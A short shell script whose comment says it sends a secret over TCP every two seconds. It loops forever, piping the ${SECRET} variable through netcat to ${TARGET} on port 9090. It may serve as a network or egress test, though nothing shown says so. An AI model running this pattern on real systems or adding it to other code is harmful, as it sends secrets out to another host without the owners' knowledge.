# each 2 seconds, send secret over TCP

while true; do
  echo "($(date)) Sending secret..."
  echo ${SECRET} | nc ${TARGET} 9090
  sleep 2
done